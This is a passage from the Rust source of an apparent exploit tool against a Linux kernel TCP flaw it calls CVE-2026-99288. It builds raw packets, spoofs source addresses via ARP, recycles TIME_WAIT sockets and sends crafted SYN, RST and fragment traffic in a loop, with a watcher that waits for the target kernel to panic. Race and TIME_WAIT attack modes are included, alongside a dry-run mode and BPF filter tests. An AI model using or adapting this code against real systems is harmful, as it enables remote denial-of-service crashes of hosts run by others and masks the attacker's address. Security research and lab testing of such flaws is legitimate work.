            // recycle the TIME_WAIT socket into a hashed request socket;
            // the ISN must be strictly after tw_rcv_nxt (s1 + 2)
            let next = s1.wrapping_add(3);
            *s2 = next;
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, next, 0, FLAG_SYN, true, 0);
            self.wait_synack(port, next, mark, self.synack_timeout)?;
            thread::sleep(Duration::from_micros(50));
            self.stats.cookies += 1;
            Some(cookie)
        }

        /// Best-effort teardown for a tuple that failed mid-handshake.
        fn abort_tuple(&mut self, port: u16, s1: u32, s2: Option<u32>) {
            let mut packets = Vec::with_capacity(2);
            for sequence in std::iter::once(s1).chain(s2) {
                let tcp = self.build_segment(port, sequence.wrapping_add(1), 0, FLAG_RST, 0, 0);
                let id = self.next_packet_id();
                packets.push(ipv4_packet(
                    self.source,
                    self.config.target,
                    id,
                    0,
                    false,
                    &tcp,
                ));
            }
            self.transmit_batch(&packets);
        }

        fn mode_tw(&mut self) -> io::Result<()> {
            println!(
                "[*] TIME_WAIT mode: needs net.ipv4.tcp_syncookies=2 and a listener that accepts and closes immediately (see lab/close-listener.py)"
            );
            self.leak_check()?;
            self.auto_tune_timeout()?;
            self.fragment_path_probe()?;
            if !self.config.no_watch {
                self.watch = Some(Watcher::start(&self.config, self.watch_source));
            }
            println!("Ctrl+C to stop; only a target kernel log can confirm the panic");
            let started = Instant::now();
            let deadline = Self::run_deadline(started, self.config.duration)?;
            let mut next_report = started + Duration::from_secs(5);
            while !STOP.load(Ordering::Acquire) {
                if deadline.is_some_and(|deadline| Instant::now() >= deadline) {
                    break;
                }
                self.tw_attempt();
                if Instant::now() >= next_report {
                    self.report_stats(started);
                    next_report = Instant::now() + Duration::from_secs(5);
                }
            }
            self.cleanup_previous();
            self.report_stats(started);
            Ok(())
        }
    }

    impl Drop for Engine {
        fn drop(&mut self) {
            self.junk_drain_all();
            self.cleanup_previous();
        }
    }

    pub fn run(config: Config) -> io::Result<()> {
        STOP.store(false, Ordering::Release);
        TARGET_DOWN.store(false, Ordering::Release);
        if config.dry_run {
            return dry_run(config);
        }
        unsafe {
            libc::signal(libc::SIGINT, stop_signal as *const () as libc::sighandler_t);
            libc::signal(
                libc::SIGTERM,
                stop_signal as *const () as libc::sighandler_t,
            );
        }

        let (source, interface, interface_index, arp) = if config.spoof {
            let source = config.src.expect("validated in main");
            if is_local_addr(source) {
                return Err(invalid_input(
                    "--src must not be a local address in --spoof mode (the point is that the local stack does not own it)",
                ));
            }
            let (route_interface, gateway) = route_lookup(config.target)?;
            if gateway != 0 {
                return Err(invalid_input(
                    "--spoof requires an on-link target (the route goes through a gateway); use the iptables RST filter instead",
                ));
            }
            let interface = config.dev.clone().unwrap_or(route_interface);
            let interface_index = interface_index(&interface)?;
            let mac = interface_mac(&interface)?;
            (
                source,
                interface,
                interface_index,
                Some(ArpContext {
                    spoofed: source,
                    mac,
                    interface_index,
                }),
            )
        } else {
            let source = match config.src {
                Some(source) => {
                    if !is_local_addr(source) {
                        return Err(invalid_input(
                            "--src must be a local address unless --spoof is used",
                        ));
                    }
                    source
                }
                None => local_address(config.target, config.port)?,
            };
            let interface = match &config.dev {
                Some(dev) => dev.clone(),
                None => interface_name_for_address(source)?,
            };
            let interface_index = interface_index(&interface)?;
            (source, interface, interface_index, None)
        };

        println!(
            "[*] mode={:?} target={}:{} source={}{} dev={} ports={}..{}",
            config.mode,
            config.target,
            config.port,
            source,
            if config.spoof {
                " (spoofed via ARP)"
            } else {
                ""
            },
            interface,
            config.source_port,
            usize::from(config.source_port) + config.source_port_count - 1
        );
        let sender = Sender::Raw(RawSocket::sender(config.mark, &interface)?);
        let sniffer = Sniffer::start(
            interface_index,
            source,
            config.target,
            config.port,
            config.source_port,
            config.source_port_count,
            config.debug,
            arp,
            config.pin,
        )?;
        let filter = RstFilter::install(&config)?;
        if config.pin {
            pin_to(0);
        }
        // The watcher must originate from an address the local stack owns:
        // with --spoof the engine's source is foreign by design, so fall back
        // to the route's local address (UNSPECIFIED lets the kernel choose).
        let watch_source = if config.spoof {
            local_address(config.target, config.port).unwrap_or(Ipv4Addr::UNSPECIFIED)
        } else {
            source
        };
        let mut engine = Engine::new(config, source, sender, sniffer, filter);
        engine.watch_source = watch_source;
        match engine.config.mode {
            Mode::Probe => engine.mode_probe(),
            Mode::Verify => engine.mode_verify(),
            Mode::Race => match engine.mode_race() {
                Ok(()) => Ok(()),
                Err(error) if error.to_string().contains("syncookies=2") => {
                    println!(
                        "[*] target answers every SYN with a cookie; retrying in TIME_WAIT mode"
                    );
                    engine.mode_tw()
                }
                Err(error) => Err(error),
            },
            Mode::Tw => engine.mode_tw(),
        }
    }

    /*
     * --dry-run: exercise the whole round construction offline. No sockets
     * are opened and nothing is sent; waits return immediately, so no
     * cookies are "harvested" and the shot group is built explicitly with a
     * synthetic tuple to cover the fragment/RST/ACK builders as well.
     */
    fn dry_run(config: Config) -> io::Result<()> {
        println!("[dry-run] no sockets opened, no packets sent");
        let source = config.src.unwrap_or_else(|| {
            local_address(config.target, config.port).unwrap_or(Ipv4Addr::new(192, 0, 2, 1))
        });
        let fill = config.backlog.unwrap_or(128);
        let batch = if config.batch == 0 {
            fill.clamp(1, MAX_BATCH)
        } else {
            config.batch
        };
        let split = config
            .frag_split
            .unwrap_or_else(|| default_split(config.payload));
        let mut engine = Engine::new(
            config,
            source,
            Sender::Dry,
            Sniffer::dry(),
            RstFilter::disabled(),
        );
        engine.calibrated_fill = fill;
        engine.run_round(batch);
        println!(
            "[dry-run] round built: packets={} (fill={fill}, harvest={batch}, drain={fill})",
            engine.stats.packets
        );
        let port = engine.take_source_port();
        let mut target = Target {
            port,
            harvest_sequence: 0x0000_1000,
            request_sequence: 0x0000_2000,
            cookie: Some(0x0000_3000),
            mark: 0,
            packet_id: 0,
        };
        engine.shoot(std::slice::from_mut(&mut target));
        println!(
            "[dry-run] synthetic shot built: split={split} payload={} readers={} total packets={}",
            engine.config.payload, engine.config.readers, engine.stats.packets
        );
        println!("[dry-run] ok; run --selftest for checksum and framing verification");
        Ok(())
    }

    fn local_address(target: Ipv4Addr, port: u16) -> io::Result<Ipv4Addr> {
        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.connect(SocketAddr::from((target, port)))?;
        match socket.local_addr()?.ip() {
            std::net::IpAddr::V4(address) if !address.is_unspecified() => Ok(address),
            _ => Err(io::Error::new(
                io::ErrorKind::AddrNotAvailable,
                "an IPv4 source address is required",
            )),
        }
    }

    fn is_local_addr(address: Ipv4Addr) -> bool {
        UdpSocket::bind((address, 0)).is_ok()
    }

    /*
     * Longest-prefix match from /proc/net/route (values are network-order
     * hex, directly comparable with in_addr.s_addr). gateway == 0 means the
     * destination is on-link, which --spoof requires.
     */
    fn route_lookup(target: Ipv4Addr) -> io::Result<(String, u32)> {
        let table = std::fs::read_to_string("/proc/net/route")?;
        let destination_address = u32::from_ne_bytes(target.octets());
        let mut best: Option<(u32, String, u32)> = None;
        for line in table.lines().skip(1) {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() < 8 {
                continue;
            }
            let Ok(destination) = u32::from_str_radix(fields[1], 16) else {
                continue;
            };
            let Ok(gateway) = u32::from_str_radix(fields[2], 16) else {
                continue;
            };
            let Ok(mask) = u32::from_str_radix(fields[7], 16) else {
                continue;
            };
            if destination_address & mask != destination & mask {
                continue;
            }
            if best
                .as_ref()
                .is_none_or(|(best_mask, _, _)| mask > *best_mask)
            {
                best = Some((mask, fields[0].to_string(), gateway));
            }
        }
        match best {
            Some((_, interface, gateway)) => Ok((interface, gateway)),
            None => Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("no route to {target} in /proc/net/route"),
            )),
        }
    }

    fn interface_index(name: &str) -> io::Result<i32> {
        let interface_name = CString::new(name).map_err(|_| {
            invalid_input("the network interface name contains an unexpected NUL byte")
        })?;
        let index = unsafe { libc::if_nametoindex(interface_name.as_ptr()) };
        if index == 0 {
            return Err(io::Error::last_os_error());
        }
        Ok(index as i32)
    }

    fn interface_mac(name: &str) -> io::Result<[u8; 6]> {
        // Prefer getifaddrs(): sysfs is not namespaced, so /sys/class/net/<if>
        // can be absent in containers and network namespaces even though the
        // interface itself exists.
        unsafe {
            let mut addresses = ptr::null_mut();
            if libc::getifaddrs(&mut addresses) != 0 {
                return Err(io::Error::last_os_error());
            }
            let mut current = addresses;
            let mut result = None;
            while !current.is_null() {
                let entry = &*current;
                if !entry.ifa_addr.is_null()
                    && (*entry.ifa_addr).sa_family == libc::AF_PACKET as libc::sa_family_t
                    && CStr::from_ptr(entry.ifa_name).to_bytes() == name.as_bytes()
                {
                    let address = &*(entry.ifa_addr as *const libc::sockaddr_ll);
                    if address.sll_halen >= 6 {
                        let mut mac = [0u8; 6];
                        mac.copy_from_slice(&address.sll_addr[..6]);
                        result = Some(mac);
                        break;
                    }
                }
                current = entry.ifa_next;
            }
            libc::freeifaddrs(addresses);
            if let Some(mac) = result {
                return Ok(mac);
            }
        }
        Err(io::Error::new(
            io::ErrorKind::NotFound,
            format!("cannot read the MAC address of {name}"),
        ))
    }

    fn interface_name_for_address(source: Ipv4Addr) -> io::Result<String> {
        let expected = u32::from_ne_bytes(source.octets());
        unsafe {
            let mut addresses = ptr::null_mut();
            if libc::getifaddrs(&mut addresses) != 0 {
                return Err(io::Error::last_os_error());
            }
            let mut current = addresses;
            let mut result = None;
            while !current.is_null() {
                let entry = &*current;
                if !entry.ifa_addr.is_null()
                    && (*entry.ifa_addr).sa_family == libc::AF_INET as libc::sa_family_t
                {
                    let address = &*(entry.ifa_addr as *const libc::sockaddr_in);
                    if address.sin_addr.s_addr == expected {
                        result = Some(
                            CStr::from_ptr(entry.ifa_name)
                                .to_string_lossy()
                                .into_owned(),
                        );
                        break;
                    }
                }
                current = entry.ifa_next;
            }
            libc::freeifaddrs(addresses);
            result.ok_or_else(|| {
                io::Error::new(
                    io::ErrorKind::NotFound,
                    format!("cannot find the interface owning source address {source}"),
                )
            })
        }
    }

    fn raw_socket_error() -> io::Error {
        let error = io::Error::last_os_error();
        io::Error::new(
            error.kind(),
            format!("{error}; raw sockets require root or CAP_NET_RAW"),
        )
    }

    fn invalid_input(message: impl Into<String>) -> io::Error {
        io::Error::new(io::ErrorKind::InvalidInput, message.into())
    }

    fn socket_address(address: Ipv4Addr, port: u16) -> libc::sockaddr_in {
        libc::sockaddr_in {
            sin_family: libc::AF_INET as libc::sa_family_t,
            sin_port: port.to_be(),
            sin_addr: libc::in_addr {
                s_addr: u32::from_ne_bytes(address.octets()),
            },
            sin_zero: [0; 8],
        }
    }

    #[cfg(test)]
    mod filter_tests {
        use super::filter_program;

        const PASS: u32 = 65_535;
        const DROP: u32 = 0;

        fn read_u16(frame: &[u8], offset: usize) -> Option<u16> {
            let bytes = frame.get(offset..offset + 2)?;
            Some(u16::from_be_bytes([bytes[0], bytes[1]]))
        }

        // Minimal classic-BPF interpreter with the kernel's out-of-bounds
        // load behaviour (abort the program and return 0).
        fn run(code: &[libc::sock_filter], frame: &[u8]) -> u32 {
            let ld_h_abs = (libc::BPF_LD | libc::BPF_H | libc::BPF_ABS) as u16;
            let ld_b_abs = (libc::BPF_LD | libc::BPF_B | libc::BPF_ABS) as u16;
            let ld_h_ind = (libc::BPF_LD | libc::BPF_H | libc::BPF_IND) as u16;
            let ldx_b_msh = (libc::BPF_LDX | libc::BPF_B | libc::BPF_MSH) as u16;
            let jmp_jeq_k = (libc::BPF_JMP | libc::BPF_JEQ | libc::BPF_K) as u16;
            let jmp_jset_k = (libc::BPF_JMP | libc::BPF_JSET | libc::BPF_K) as u16;
            let ret_k = (libc::BPF_RET | libc::BPF_K) as u16;
            let mut accumulator = 0u32;
            let mut index = 0usize;
            let mut pc = 0usize;
            loop {
                let Some(insn) = code.get(pc) else {
                    return DROP;
                };
                if insn.code == ld_h_abs {
                    let Some(value) = read_u16(frame, insn.k as usize) else {
                        return DROP;
                    };
                    accumulator = u32::from(value);
                    pc += 1;
                } else if insn.code == ld_b_abs {
                    let Some(value) = frame.get(insn.k as usize) else {
                        return DROP;
                    };
                    accumulator = u32::from(*value);
                    pc += 1;
                } else if insn.code == ldx_b_msh {
                    let Some(value) = frame.get(insn.k as usize) else {
                        return DROP;
                    };
                    index = usize::from(value & 0x0f) * 4;
                    pc += 1;
                } else if insn.code == ld_h_ind {
                    let Some(value) = read_u16(frame, index + insn.k as usize) else {
                        return DROP;
                    };
                    accumulator = u32::from(value);
                    pc += 1;
                } else if insn.code == jmp_jeq_k {
                    let taken = accumulator == insn.k;
                    pc += 1 + usize::from(if taken { insn.jt } else { insn.jf });
                } else if insn.code == jmp_jset_k {
                    let taken = accumulator & insn.k != 0;
                    pc += 1 + usize::from(if taken { insn.jt } else { insn.jf });
                } else if insn.code == ret_k {
                    return insn.k;
                } else {
                    return DROP;
                }
            }
        }

        fn ipv4_tcp(
            ihl: usize,
            protocol: u8,
            source_port: u16,
            target_port: u16,
            tcp_len: usize,
        ) -> Vec<u8> {
            let mut frame = vec![0u8; 14 + ihl + tcp_len];
            frame[12..14].copy_from_slice(&0x0800u16.to_be_bytes());
            frame[14] = 0x40 | ((ihl / 4) as u8);
            frame[23] = protocol; // frame[14 + 9]
            let tcp = 14 + ihl;
            frame[tcp..tcp + 2].copy_from_slice(&source_port.to_be_bytes());
            frame[tcp + 2..tcp + 4].copy_from_slice(&target_port.to_be_bytes());
            frame[tcp + 12] = ((tcp_len / 4) as u8) << 4;
            frame
        }

        #[test]
        fn filter_passes_bare_acks_and_rsts_for_the_target_port() {
            let filter = filter_program(9000, false);
            // SYN-ACK with options: the shape that worked even with the old
            // offset bug.
            assert_eq!(run(&filter, &ipv4_tcp(20, 6, 9000, 40000, 32)), PASS);
            // Bare ACK/RST: no options, so the old x+34 load was out of bounds
            // and the kernel dropped these.  Challenge ACKs and host-RST leak
            // detection depend on them.
            assert_eq!(run(&filter, &ipv4_tcp(20, 6, 9000, 40000, 20)), PASS);
            assert_eq!(run(&filter, &ipv4_tcp(20, 6, 40000, 9000, 20)), PASS);
            // IP options shift the TCP header.
            assert_eq!(run(&filter, &ipv4_tcp(24, 6, 9000, 40000, 20)), PASS);
        }

        #[test]
        fn filter_drops_other_traffic() {
            let filter = filter_program(9000, false);
            // Final port check used to fall through into PASS.
            assert_eq!(run(&filter, &ipv4_tcp(20, 6, 1234, 5678, 20)), DROP);
            assert_eq!(run(&filter, &ipv4_tcp(20, 17, 9000, 40000, 20)), DROP);
            // Truncated destination port: out-of-bounds load -> DROP.
            let mut truncated = ipv4_tcp(20, 6, 1234, 40000, 20);
            truncated.truncate(37);
            assert_eq!(run(&filter, &truncated), DROP);
        }

        #[test]
        fn filter_handles_arp_vlan_and_fragments() {
            let mut arp = vec![0u8; 42];
            arp[12..14].copy_from_slice(&0x0806u16.to_be_bytes());
            assert_eq!(run(&filter_program(9000, false), &arp), DROP);
            assert_eq!(run(&filter_program(9000, true), &arp), PASS);

            let mut vlan = vec![0u8; 18];
            vlan[12..14].copy_from_slice(&0x8100u16.to_be_bytes());
            assert_eq!(run(&filter_program(9000, false), &vlan), PASS);

            let mut fragment = ipv4_tcp(20, 6, 1111, 2222, 20);
            fragment[20..22].copy_from_slice(&1u16.to_be_bytes()); // offset 8
            assert_eq!(run(&filter_program(9000, false), &fragment), PASS);
        }
    }
}

#[cfg(target_os = "linux")]
pub use platform::{run, target_down};

#[cfg(not(target_os = "linux"))]
pub fn run(_config: crate::Config) -> std::io::Result<()> {
    Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "CVE-2026-99288 mode requires Linux raw sockets",
    ))
}

#[cfg(not(target_os = "linux"))]
pub fn target_down() -> bool {
    false
}
